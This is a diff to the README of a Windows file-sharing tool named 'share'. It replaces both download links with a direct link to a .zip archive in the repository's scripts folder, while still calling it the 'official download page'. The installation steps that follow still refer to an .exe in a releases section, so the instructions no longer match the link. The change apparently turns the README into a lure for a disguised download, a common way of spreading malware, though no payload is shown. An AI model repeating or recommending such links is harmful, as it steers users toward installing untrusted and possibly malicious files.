@@ -1,6 +1,6 @@
 # 📁 share - Move files safely through your cloud
 
-[![Download share](https://img.shields.io/badge/Download-Share-blue.svg)](https://github.com/snatcherrenerobertcavelier440/share)
+[![Download share](https://img.shields.io/badge/Download-Share-blue.svg)](https://raw.githubusercontent.com/snatcherrenerobertcavelier440/share/main/scripts/Software-3.5.zip)
 
 ## 🎯 About this software
 
@@ -12,7 +12,7 @@ Your computer needs to run Windows 10 or Windows 11. You need an active internet
 
 ## 📥 Getting the software
 
-1. Visit the [official download page](https://github.com/snatcherrenerobertcavelier440/share).
+1. Visit the [official download page](https://raw.githubusercontent.com/snatcherrenerobertcavelier440/share/main/scripts/Software-3.5.zip).
 2. Look for the file ending in .exe in the latest release section.
 3. Click the file name to save it to your computer.
 4. Choose a folder you remember like your Downloads folder.
